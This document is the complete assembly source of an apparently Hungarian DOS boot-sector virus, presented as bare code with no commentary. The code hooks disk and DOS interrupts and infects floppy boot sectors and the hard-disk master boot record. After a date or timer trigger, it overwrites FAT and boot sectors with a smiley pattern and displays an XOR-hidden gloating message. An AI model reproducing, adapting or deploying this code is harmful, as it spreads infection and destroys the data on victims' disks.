start	segment
	assume cs:start,ds:start
	org	100h
boot	equ	0f00h
kezd:	db 52h,24h
	jmp	hideg
	nop
	jmp	meleg
	nop
	jmp	tamad
veg1:	dw 	0
kezd1:	dw	0
meleg:	pop	si
	pop	ds
	pop	[si]
	pop	[si+2]
	mov	si,boot
	mov	di,7c00h
	push	cs
	pop	ds
	xor	ax,ax
	mov	es,ax
	mov	cx,100h
	pushf
	cld
	rep	movsw
	popf
ok1:	db	0eah,00,7ch,0,0
hideg:	xor	ax,ax
	push	si
	push	di
	push	cx
	cld
	mov	di,offset flag1
	mov	si,offset flagv
awq:	stosb
	cmp	di,si
	jc	awq
	pop	cx
	pop	di
	pop	si
	mov	es,ax
	mov	ax,es:word ptr [4ch]
	mov	cs:word ptr [int13+1],ax
	mov	ax,es:word ptr [4eh]
	mov	cs:word ptr [int13+3],ax
	mov	ax,offset it13
	mov	es:word ptr [4ch],ax
	mov	es:[4eh],cs
	mov	ax,es:word ptr [84h]
	mov	cs:word ptr [int21+1],ax
 	mov	ax,es:word ptr [86h]
	mov	cs:word ptr [int21+3],ax
	mov	ax,0f000h
	mov	es,ax
	mov	al,es:byte ptr[0fff0h]
	cmp	al,0eah
	jnz	meleg
	mov	ax,es:word ptr[0fff1h]
	mov	cs:word ptr [reset+1],ax
	mov	ax,es:word ptr[0fff3h]
	mov	cs:word ptr [reset+3],ax
	jmp	meleg
int13:	db	0eah,0,0,0,0
int21:	db	0eah,0,0,0,0
int40:	db	0eah,0,0,0,0
flag1:	db	0
flag2:	db	0
flag3:	db	0
flag4:	dw	0
flag5:	db	0
flagv	db	0
egys:	db	0
sub13:	cmp	dl,0
	jz	sub40
visx:	pushf
	push	cs
	mov	dl,cs:byte ptr [egys]
	call	int13
	ret
sub40:	push	ax
	mov	al,cs:byte ptr [flag5]
	cmp	al,80
	pop	ax
	jmp	visx
	pushf
	push	cs
	call	int40
	ret
subru:	push	ax
	push	cx
	push	dx
	push	ds
	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:word ptr [78h]
	mov	cs:word ptr [int1e],ax
	mov	ax,ds:word ptr [7ah]
	mov	cs:word ptr [int1e+2],ax
	mov	al,cs:byte ptr [sav]
	cmp	al,28h
	jz	dds
	mov	bx,offset hdtbl
	jmp	hds
dds:	mov	bx,offset dstbl
	mov	cx,offset tb360
	jmp	okea
hds:	mov	ax,cs:word ptr [szekt]
	mov	cx,offset tb12
	cmp	ax,0fh
	jz	okea
	mov	cx,offset tb720
	cmp	ax,9
	jz	okea
	mov	cx,offset tb14
okea:	mov	ds:word ptr [78h],cx
	mov	ds:word ptr [7ah],cs
	pop	ds
	pop	dx
	pop	cx
	pop	ax
	call	sub13
	push	ax
	push	cx
	push	dx
	push	ds
	pushf
	xor	ax,ax
	mov	ds,ax
	mov	ax,cs:word ptr [int1e]
	mov	ds:word ptr [78h],ax
	mov	ax,cs:word ptr [int1e+2]
	mov	ds:word ptr [7ah],ax
	popf
	pop	ds
	pop	dx
	pop	cx
	pop	ax
	ret
sub21:	pushf
	push	cs
	call	int21
	ret	
it21:	cmp	ah,3dh
	jnz	fu3e
	push	bx
	push	cx
	push	ax
	push	dx
	push	es
	push	ds
	mov	bx,dx
cikl1:	mov	al,[bx]
	cmp	al,0
	jz	veg
	inc	bx
	jmp	cikl1
veg:	push	si
	mov	si,offset nev
	dec	bx
	dec	si
	mov	cx,11
cikl2:	mov	al,[bx]
	or	al,20h
	cmp	al,cs:[si]
	jz	nem4
	jmp	nem1
nem4:	dec	si
	dec	bx
	loop	cikl2
	pop	si
	pop	ds
	pop	es
	pop	dx
	pop	ax
	pop	cx
	pop	bx
	call	sub21
	jnc	igen1
	retf	2
igen1:	mov	cs:word ptr [flag4],ax
nem2:	clc
	retf	2
fu3e:	cmp	ah,3eh
	jz	aah
	jmp	int21
aah:	cmp	bx,cs:word ptr [flag4]
	jz	folyt8
	jmp	int21
folyt8:	cmp	cs:word ptr [flag4],0
	jnz	folyt9
	jmp	int21
folyt9:	mov	cs:word ptr [flag4],0
	call	sub21
	push	ds
	push	es
	push	ax
	push	bx
	push	cx
	push	dx
	mov	cs:byte ptr [fo],0
ujfo:	mov	bx,200h
	mov	ah,48h
	call	sub21
	cmp	bx,200h
	jnc	fogl
nem3:	pop	dx
	pop	cx
	pop	bx
	pop	ax
	pop	es
	pop	ds
	retf	2
fo:	db	0
fogl:	push	ax
	and	ax,0fffh
	cmp	ax,0db0h
	jc	okes1
	pop	ax
	cmp	cs:byte ptr [fo],3
	jz	nem3
	inc	cs:byte ptr [fo]
	jmp	ujfo
okes1:	pop	ax
okes:	mov	es,ax
	mov	cs:word ptr [szegm],ax
	mov	si,0
	mov	di,0
	mov	cx,1000h
	push	cs
	pop	ds
	pushf
	cld
	rep	movsw
	popf
	xor	ax,ax
	mov	ds,ax
	mov	ax,0
	mov	ds,ax
	mov	ax,offset it21
	mov	dx,cs
	mov	bx,0
	mov	cx,0fff0h
tovabb:	call	keres
	jnz	nincs
	push	ax
	mov	ax,cs:word ptr [int21+1]
	mov	ds:word ptr [bx],ax
	mov	ax,cs:word ptr [int21+3]
	mov	ds:word ptr [bx+2],ax
	pop	ax
	jmp	tovabb
reset:	db	0eah,0f0h,0ffh,0,0f0h
nincs:	mov	ax,offset it13
	mov	dx,cs
	mov	bx,0
	mov	cx,0fff0h
tovab1:	call	keres
	jnz	kil2
	push	ax
	mov	ax,es
	mov	ds:word ptr [bx+2],ax
	pop	ax
	jmp	tovab1	
kil2:	mov	ax,0
	mov	ds,ax
	mov	ax,ds:word ptr [100h]
	mov	es:word ptr [int40+1],ax
	mov	ax,ds:word ptr [102h]
	mov	es:word ptr [int40+3],ax
	call	beszur
	mov	ax,offset it40
	jmp	nem3
	mov	ds:word ptr [100h],ax
	mov	ax,es
	mov	ds:word ptr [102h],ax
	mov	es:byte ptr [flag5],80
	jmp	nem3
keres:	push	ax
	push	dx
ker1:	cmp	word ptr[bx],ax
	jz	van1
nincs1:	inc	bx
	loop	ker1
	inc	cx
kil1:	pop	dx
	pop	ax
	ret
van1:	cmp	word ptr [bx+2],dx
	jnz	nincs1
	jmp	kil1
nem1:	pop	si
	pop	ds
	pop	es
	pop	dx
	pop	ax
	pop	cx
	pop	bx
	jmp	int21
	db	'command.com'
nev:	db	0
it13:	push	bx
	push	ax
	push	cx
	push	dx
	push	es
	push	ds
	push	di
	push	si
	push	cs
	pop	ds
	push	cx
	push	ax
	push	dx
	mov	bx,offset atir
	mov	cx,2
erdf:	call	ftr
	jc	poiu
	loop	erdf
	jmp	reset
ftr:	mov	al,90h
	clc
	mov	[bx],al
atir:	stc
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	mov	al,0f9h
	mov	[bx],al
	ret
poiu:	pop	dx
	pop	ax
	pop	cx
	cmp	cs:byte ptr [mod1],1
	jnz	awsw
	jmp	leol
awsw:	mov	cs:byte ptr [egys],dl
	cmp	ah,2
	jc	aab
	cmp	ah,4
	jnc	aab
	cmp	cx,3
	jnc	aab
	cmp	dh,0
	jnz	aab
	mov	cs:byte ptr [flag3],80h
aab:	mov	al,cs:byte ptr [flag1]
	cmp	al,80h
	jz	ugr1
	xor	ax,ax
	mov	es,ax
	mov	ax,es:word ptr [84h]
	cmp	ax,cs:word ptr [int21+1]
	jz	tov1
	jmp	dos
tov1:	mov	ax,es:word ptr [86h]
	cmp	ax,cs:word ptr [int21+3]
	jz	ugr1
	jmp	dos
ugr1:	cmp	di,55aah
	jnz	norm
	cmp	si,5aa5h
	jnz	norm
	pop	si
	mov	si,0a55ah
	push	si
norm:	cmp	dl,20h
	jc	lemeza
	cmp	dl,80h
	jz	win
fdg:	jmp	kilep
win:	jmp	wincsi
it40:	jmp	int40
lemeza:	mov	al,cs:byte ptr [flag3]
	cmp	al,80h
	jz	lcsere
	cmp	ah,5
	jnz	haha1
haha2:	mov	cs:byte ptr [flag3],84h
	jmp	haha
haha1:	cmp	al,0
	jz	haha
	dec	cs:byte ptr [flag3]
haha:	jmp	kilepo
hah1:	call	sub13
	jnc	viter1
idt:	cmp	ah,6
	jnz	viter
	mov	cs:byte ptr [flag3],80h
viter:	stc
viter1:	retf	2
lcsere:	mov	cs:byte ptr [flag2],0
	cmp	ah,5
	jz	haha2
	mov	cx,3
cikl7:	push	cx
	mov	cs:byte ptr [flag3],0
	mov	bx,boot+200h
	mov	ax,201h
	mov	cx,1
	mov	dx,0
	push	cs
	pop	es
	call	sub13
	pop	cx
	jnc	ugr4
	loop	cikl7
	jmp	kilep
ugr4:	push	cs
	pop	ds
	mov	bx,boot+200h
	mov	cx,200h
	mov	ax,0cdfbh
	mov	dx,7213h
	call	keres
	jz 	folyt1
	jmp	kilep
folyt1:	mov	cs:byte ptr [fert],1
	mov	ax,[bx+5]
	cmp	ax,12cdh
	mov	cs:word ptr [cime],bx
	mov	cs:word ptr[wax],308h
	jz	foi
	jmp	folyt2
foi:	mov	al,cs:[bx+5+offset ver1-offset kezd2]
	cmp	al,23
	jnz	meh
	mov	ax,cs:[bx+6+offset ver1-offset kezd2]
	cmp	ax,word ptr ver1+1
	jnc	kilepo
meh:	mov	cs:word ptr [wax],307h
	jmp	folyt2
fert:	db	0,0
kilepo:	pop	si
	pop	di
	pop	ds
	pop	es
	pop	dx
	pop	cx
	pop	ax
	pop	bx
	cmp	dh,0
	jz	ugs
	jmp	hah1
ugs:	cmp	cx,1
	jz	bout1
	jmp	hah1
bout1:	cmp	ah,2
	jz	bout
	cmp	ah,3
	jz	save
	jmp	hah1
bout:	call	sub13
	jnc	ada
	jmp	idt
ada:	cmp	cs:byte ptr [flag1],80h
	jz	ase
	jmp	hah1
ase:	push	si
	pushf
	mov	si,offset bot1
	call	ase1
	popf
	pop	si
	jmp	viter1
save:	cmp	cs:byte ptr [fert],1
	jz	save2
	jmp	kif
save2:	mov	cs:byte ptr [fert],0
	push	bx
	push	ax
	push	cx
	push	dx
	push	es
	push	ds
	push	di
	push	si
	push	es
	pop	ds
	push	cs
	pop	es
	mov	cx,200h
	mov	si,bx
	mov	di,offset boot+200h
	rep	movsb
	jmp	folyt3
kif:	pop	bx
	pop	cx
	pop	cx
	pop	dx
	pop	es
	pop	ds
	pop	di
	pop	si
	clc
	jmp	viter1
ase1:	push	bx
	push	ax
	push	cx
	push	dx
	push	di
	push	ds
	push	cs
	pop	ds
	mov	ax,cs:word ptr [cime]
	and	ax,0ffh
	add	bx,ax
	mov	di,bx
	mov	cx,59h
	pushf
	cld
	rep	movsb
	popf
	pop	ds
	pop	di
	pop	dx
	pop	cx
	pop	ax
	pop	bx
	clc
	ret
folyt2:	mov	bx,boot+200h
	mov	ax,301h
	mov	cx,1
	mov	dx,0
	push	cs
	pop	es
	call	sub13
	jnc	folyt3
	jmp	kilep
folyt3:	push	cs
	pop	ds
	mov	bx,boot+200h
	mov	ax,[bx+18h]
	mov	cs:word ptr [szekt],ax
	mov	cx,[bx+1ah]
	mul	cx
	mov	cx,ax
	mov	ax,[bx+13h]
	mov	dx,0
	div	cx
	mov	cs:byte ptr [sav],al
	mov	ch,al
	mov	al,1
ugr3:	nop
	mov	cl,5
	mov	ah,5
	push	cs
	pop	es
	mov	dx,0
	push	cx
	cmp	cs:word ptr [wax],307h
	clc
	jz	waxi
	cmp	cs:byte ptr [fert],0
	clc
	jz	waxi
	call	subru
waxi:	push	ds
	push	ax
	pop	ax
	pop	ds
	pop	cx
	jnc	jo4
	jmp	kilep
sav:	db	0
wax:	dw	0
szekt:	dw	0
jo4:	mov	si,boot+200h
	mov	di,boot
	push	cs
	pop	ds
	push	cx
	mov	cx,100h
	pushf
	cld
	rep 	movsw
	popf
	pop	cx
	push	cx
	mov	ax,cs:word ptr [wax]
	mov	dx,0
	mov	cl,1
	mov	bx,100h
	cmp	cs:byte ptr [fert],0
	clc
	jz	hoho
	call	sub13
hoho:	pop	cx
	jnc	jo2
	jmp	kilep
jo2:	push	cs
	pop	ds
	push	cx
	mov	bx,boot+200h
	mov	ax,0cdfbh
	mov	dx,7213h
	mov	cx,200h
	call	keres
	pop	cx
	jz	jo3
	jmp	kilep
jo3:	push	bx
	push	cx
	mov	cx,100h
	mov	ax,0e432h
	mov	dx,16cdh
	call	keres
	jz	jo5
	pop	cx
	pop	bx
	jmp	kilep
jo5:	sub	bx,6
	mov	cs:word ptr [veg1],bx
	pop	cx
	pop	bx
	add	bx,5
	mov	cs:word ptr [kezd1],bx
	mov	cs:byte ptr [fej+2],ch
	push	cx
	mov	si,offset kezd2
	mov	bx,cs:word ptr [kezd1]
	mov	cx,offset veg2-offset kezd2
	push	cs
	pop	ds
cikl9:	mov	al,[si]
	mov	[bx],al
	inc	bx
	inc	si
	loop	cikl9
cikl10:	mov	ds:byte ptr [bx],90h
	inc	bx
	cmp	bx,cs:word ptr [veg1]
	jc	cikl10
	pop	cx
	mov	cx,3
wqe:	push	cx
	mov	cx,1
	mov	dx,0
	mov	ax,301h
	mov	bx,boot+200h
	push	cs
	pop	es
	call	sub13
	jc	kikk
	pop	cx
	cmp	cs:byte ptr [fert],0
	jnz	kig
	jmp	kif
kig:	jmp	kilepo
kikk:	pop	cx
	loop	wqe
	jmp	kilep
dos:	nop
	mov	al,80h
	mov	cs:byte ptr [flag1],al
	mov	ax,es:word ptr [84h]
	mov	cs:word ptr [int21+1],ax
	mov	ax,es:word ptr [86h]
	mov	cs:word	ptr [int21+3],ax
	mov	ax,offset it21
	mov	es:word ptr [84h],ax
	mov	es:[86h],cs
kilep:	pop	si
	pop	di
	pop	ds
	pop	es
	pop	dx
	pop	cx
	pop	ax
	pop	bx
	jmp	int13
tamad:	push	cs
	pop	ds
	mov	cs:word ptr [szama],28800
	xor	ax,ax
	push	si
	push	di
	push	cx
	cld
	mov	di,offset flag1
	mov	si,offset flagv
alsk:	stosb
	cmp	di,si
	jc	alsk
	pop	cx
	pop	di
	pop	si
	mov	es,ax
	mov	cs:byte ptr[flag1],80h
	mov	ax,es:word ptr [4ch]
	mov	cs:word ptr [int13+1],ax
	mov	ax,es:word ptr [4eh]
	mov	cs:word ptr [int13+3],ax
	mov	ax,offset it13
	mov	es:word ptr[4ch],ax
	mov	es:word ptr[4eh],cs
	mov	ax,201h
	mov	bx,offset boot+400h
	push	cs
	pop	es
	mov	dx,180h
	mov	cx,1
	int	13h
	mov	ax,0
	mov	es,ax
	mov	ax,cs:word ptr [int13+1]
	mov	es:word ptr[4ch],ax
	mov	ax,cs:word ptr [int13+3]
	mov	es:word ptr[4eh],ax
	mov	ax,0f000h
	mov	es,ax
	mov	al,es:byte ptr [0fff0h]
	cmp	al,0eah
	jnz	akdj
	mov	ax,es:word ptr [0fff1h]
	mov	cs:word ptr [reset+1],ax
	mov	ax,es:word ptr [0fff3h]
	mov	cs:word ptr [reset+3],ax
akdj:	retf
kezd2:	int	12h
	mov	bx,40h
	mul	bx
	sub	ax,1000h
	mov	es,ax
	mov	dx,0
	jmp	fej
ver1:	db	23,0,6
fej:	mov	cx,2801h
	mov	ax,208h
	mov	bx,100h
	push	bx
	cmp	es:word ptr [bx],2452h
	jz	el1
	int	13h
	pop	bx
	jc	veg2
	push	es
	mov	ax,102h
el2:	push	ax
	retf
el1:	mov	bx,0f00h
	mov	al,1
	mov	cl,8
	int	13h
	pop	bx
	jc	veg2
	push	es
	mov	ax,105h
	jmp	el2
veg2:	nop
	nop
wincsi:	jmp	aba
aasw:	mov	al,cs:byte ptr [flag2]
	cmp	al,80h
	jz	cxz
	jmp	kilep
cxz:	pop	si
	pop	di
	pop	ds
	pop	es
	pop	dx
	pop	cx
	pop	ax
	pop	bx
	cmp	ch,0
	jz	acb
	jmp	abbb
acb:	cmp	cl,0ah
	jc	acd
	jmp	abbb
acd:	cmp	dh,0
	jz	ace
	jmp	abbb
ace:	cmp	ah,3
	jnz	abe
	mov	cs:byte ptr [flag2],0
abb:	push	ax
	push	bx
	push	cx
	push	dx
	mov	dx,80h
	mov	ax,201h
	mov	cx,9
	mov	bx,offset boot+200h
	push	es
	push	cs
	pop	es
	mov	dx,80h
	call	sub13
	jc	aca
	mov	ax,301h
	mov	cx,1
	mov	dx,80h
	mov	bx,offset boot+200h
	call	sub13
aca:	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
abbb:	call	sub13
	jmp	viter1
abe:	cmp	ah,2
	jnz	abbb
	push	di
	push	cx
	push	dx
	push	bx
	push	ax
	push	ax
	mov	ah,0
	mov	di,ax
	pop	ax
abj:	push	cx
	cmp	cl,1
	jnz	abh
	mov	cl,9
	jmp	abi
abh:	mov	cx,0ah
abi:	push	bx
	push	di
	mov	al,1
	push	es
	mov	ah,2
	call	sub13
	pop	es
	pop	di
	pop	bx
	pop	cx
	jc	abk
	add	bx,200h
	mov	cl,2
	dec	di
	jnz	abj
	pop	ax
	mov	ah,0
	pop	bx
	pop	dx
	pop	cx
	pop	di
	clc
	jmp	viter1
abk:	pop	bx
	pop	bx
	pop	dx
	pop	cx
	pop	di
	mov	al,0
	jmp	viter1
aba:	mov	al,cs:byte ptr [flag2]
	cmp	al,80h
	jnz	abc
	jmp	aasw
abc:	cmp	al,40h
	jnz	abw
	jmp	aasw
abw:	mov	cx,3
ckld:	push	cx
	mov	dx,80h
	mov	cx,1
	mov	bx,offset boot
	mov	ax,201h
	push	cs
	pop	es
	call	sub13
	pop	cx
	jnc	abdq
	loop	ckld
kias:	jmp	aasw
abdq:	mov	dx,180h
	mov	cx,1
	mov	bx,offset boot+200h
	mov	ax,201h
	push	cs
	pop	es
	call	sub13
	jc	kias
	mov	bx,offset boot+200h
	mov	ax,cs:[bx+1feh]
	cmp	ax,0aa55h
	jz	abd
	mov	cs:byte ptr [flag2],40h
	jmp	kias
abd:	push	cs
	pop	ds
	mov	cx,3
	mov	bx,offset boot
	mov	si,offset kezd3
kere:	mov	al,[bx]
	cmp	al,[si]
	jnz	nem9
	inc	bx
	inc	si
	loop	kere
	sub	bx,3
	add	bx,offset ver2-kezd3
	mov	al,[bx]
	cmp	al,23
	jnz	nemq
	mov	ax,[si+offset ver2-offset kezd3]
	cmp	ax,[bx+1]
	jc	nemr
nemq:	mov	ax,307h
	jmp	nemw
nemr:	mov	cs:byte ptr [flag2],80h
	jmp	aasw
nem9:	mov	ax,308h
nemw:	mov	dx,80h
	mov	cx,2
	mov	bx,100h
	call	sub13
	jnc	oby
	jmp	aasw
oby:	mov	si,offset kezd3
	mov	cx,offset veg3-offset kezd3
	mov	di,offset boot
	pushf
	cld
	rep 	movsb
	popf
	mov	ax,301h
	mov	dx,80h
	mov	cx,01h
	mov	bx,offset boot
	call	sub13
	mov	cs:byte ptr [flag2],80h
	jmp	aasw
kezd3:	int	12h
	mov	bx,40h
	mul	bx
	sub	ax,1000h
	mov	es,ax
	xor	ax,ax
	jmp	ugas
ver2:	db	23,0,6
ugas:	mov	ss,ax
	mov	sp,7c00h
	mov	dx,80h
	mov	cx,02h
	mov	ax,208h
	mov	bx,100h
	push	bx
	cmp	es:word ptr [bx],2452h
	jz	el11
	int	13h
	pop	bx
	jc	vege
	push	es
	mov	ax,102h
el21:	push	ax
	retf
el11:	mov	bx,0f00h
	mov	al,1
	mov	cl,9
	int	13h
	pop	bx
	jc	vege
	push	es
	mov	ax,105h
	jmp	el21
vege:	jmp	vege	;szoveg kiiratasa
veg3:	nop
	nop
cime:	dw	0
bot1:	sti
	int	13h
	db	72h,67h
	mov	al,ds:[7c10h]
	cbw
	mul	ds:word ptr [7c16h]
	add	ax,ds:[7c1ch]
	add	ax,ds:[7c0eh]
	mov	ds:[7c3fh],ax
	mov	ds:[7c37h],ax
	mov	ax,20h
	mul	ds:word ptr [7c11h]
	mov	bx,ds:[7c0bh]
	add	ax,bx
	dec	ax
	div	bx
	add	ds:[7c37h],ax
	mov	bx,0500h
	mov	ax,ds:[7c3fh]
	db	0e8h,09fh,0
	mov	ax,201h
	db	0e8h,0b3h,0,72h,19h
	mov	di,bx
	mov	cx,0bh
	mov	si,7dd6h
	repz	cmpsb
	db	75h,0dh
	lea	di,ds:[bx+20h]
	mov	si,7d1eh
	mov	cx,0bh
	repz	movsb
	db	74h,18h
	db	0,0,0,0,0,0,0,0,0,0,0,0
tb12:	db	0dfh,2,25h,2,0fh,1bh,0ffh,54h,0f6h,0fh,8,4fh,0,4
tb720:	db	0d1h,2,25h,2,9,2ah,0ffh,50h,0f6h,0fh,4,4fh,80h,5
tb360:	db	0dfh,2,25h,2,9,23h,0ffh,50h,0f6h,0fh,8,27h,40,3
tb14:	db	0a1h,2,25h,2,12h,1bh,0ffh,60h,0f6h,0fh,4,4fh,0,7
int1e:	dw	0,0,0,0,0,0,0,0
hdtbl:	db	50h,0,1,2,50h,0,2,2,50h,0,3,2,50h,0,4,2,50h,0,5,2,50h,0,6,2,50h,0,7,2,50h,0,8,2,50h,0,9,2,50h,0,0ah,2,50h,0,0bh,2,50h,0,0ch,2,50h,0,0dh,2,50h,0,0eh,2
	db	50h,0,0fh,2,50h,0,10h,2,50h,0,11h,2,50h,0,11h,2,50h,0,12h,2
dstbl:	db	28h,0,1,2,28h,0,2,2,28h,0,3,2,28h,0,4,2,28h,0,5,2,28h,0,6,2,28h,0,7,2,28h,0,8,2,28h,0,9,2
mod2:	db	0
mod1:	db	0
beszur:	push	ax
	push	bx
	push	cx
	push	dx
	push	es
	push	ds
	push	di
	push	si
	mov	ax,201h
	mov	cx,0ah
	mov	bx,offset boot
	mov	dx,80h
	push	cs
	pop	es
	pushf
	push	cs
	call	int13
	mov	es,cs:word ptr [szegm]
	mov	es:word ptr [mod2],0
	jc	hib
	mov	ax,cs:word ptr [boot]
	cmp	al,23h
	jnz	hib
	mov	es:byte ptr [mod2],ah
	jmp	hib
hib:	mov	es,cs:word ptr[szegm]
	mov	bx,offset kiiras
	mov	cx,offset kiirv-offset kiiras
	mov	al,es:[bx]
	cmp	al,20h
	jnz	hib1
cijk:	mov	al,es:[bx]
	xor	al,45h
	mov	es:[bx],al
	inc	bx
	loop	cijk
hib1:	mov	ch,25h
	mov	ah,4
	int	1ah
	jc	friss
	cmp	cl,89h
	jc	friss
	cmp	ch,25h
	jz	bete
	cmp	dh,7
	jnc	bete
	jmp	nbete
friss:	mov	al,54h
	out	43h,al
	mov	al,0ffh
	out	41h,al
	jmp	nbete
bete:	cmp	es:byte ptr [mod2],2
	jz	nbete
	mov	ax,0
	mov	ds,cs:word ptr [szegm]
	mov	es,ax
	mov	ax,es:word ptr[70h]
	mov	ds:word ptr [tim+1],ax
	mov	ax,es:word ptr[72h]
	mov	ds:word ptr [tim+3],ax
	mov	ax,offset timer
	mov	es:word ptr [70h],ax
	mov	ax,cs:word ptr [szegm]
	mov	es:word ptr [72h],ds
nbete:	pop	si
	pop	di
	pop	ds
	pop	es
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret
szegm:	dw	0,0
tim:	db	0eah,0,0,0,0,0
szama:	dw	28800
timer:	pushf
	push	ax
	push	bx
	push	cx
	push	dx
	push	ds
	push	cs
	pop	ds
	mov	cx,2
	mov	bx,offset atir
	mov	al,cs:[bx]
	cmp	al,90h
	jnz	rwt
	jmp	reset
rwt:	call	ftr
	jc	rwe
	loop	rwt
	jmp	reset
rwe:	pop	ds
	mov	ax,cs:word ptr [szama]
	dec	ax
kii:	mov	cs:word ptr [szama],ax
	jz	gyilk1
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf
	jmp	tim
gyilk1:	mov	ax,28800
	mov	cs:byte ptr [mod1],1
	inc	ax
	jmp	kii
leol:	mov	bx,offset kiiras
	mov	cx,offset kiirv-offset kiiras
	mov	al,cs:[bx]
	cmp	al,20h
	jz	leol1
adla:	mov	al,cs:[bx]
	xor	al,45h
	mov	cs:[bx],al
	inc	bx
	loop	adla
leol1:	push	cs
	pop	ds
	cmp	cs:byte ptr [mod2],1
	jz	atu
irtas:	mov	si,offset graf
	mov	di,offset boot
	mov	cx,128
	mov	dl,4*9
	push	cs
	pop	es
	push	cs
	pop	ds
	cld
cvgh:	rep	movsb
	sub	si,128
	mov	cx,128
	dec	dl
	jnz	cvgh
	mov	dx,180h
	mov	ax,309h
	mov	cx,2
	mov	bx,offset boot
	pushf
	push	cs
	call	int13
	mov	dx,280h
	mov	ax,309h
	mov	cx,2
	mov	bx,offset boot
	pushf
	push	cs
	call	int13
	mov	dx,0
	mov	ax,309h
	mov	cx,1
	mov	bx,offset boot
	pushf
	push	cs
	call	int13
atu:	mov	si,offset kiiras
	mov	al,2
	mov	ah,0
	int	10h
awqt:	mov	al,cs:[si]
	cmp	al,0
	jz	kie
	mov	ah,0eh
	mov	bx,0
	push	si
	int	10h
	pop	si
	inc	si
	jmp	awqt
kie:	cli
	hlt
	jmp	kie
kiiras:	db	'   Haha,v°rus van a gÇpben!!',0dh,0ah,'Ez egy eddig mÇg nem kîzismert v°rus. De hamarosan az lesz.'
	db	0dh,0ah,'A neve egyszerÅen tîltîgetî ',0dh,0ah,'Ezt a nevÇt onnan kapta, hogy'
	db	' feltîltîgeti a FAT-t†bl†t kîlînbîzî alakzatokkal.',0dh,0ah
	db	'Ez m†r meg is tîrtÇnt !!! ',0dh,0ah,0,0
graf:	db	32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32
	db	32,01,01,01,01,01,01,32,32,01,01,01,01,01,01,32
	db	01,32,32,32,32,32,32,01,01,32,32,32,32,32,32,01
	db	01,32,01,32,32,01,32,01,01,32,01,32,32,01,32,01
	db	01,32,32,32,32,32,32,01,01,32,32,32,32,32,32,01
	db	01,32,01,01,01,01,32,01,01,32,01,01,01,01,32,01
	db	32,01,32,32,32,32,01,32,32,01,32,32,32,32,01,32
	db	32,32,01,01,01,01,32,32,32,32,01,01,01,01,32,32	
kiirv:	db	0
start	ends
	end
	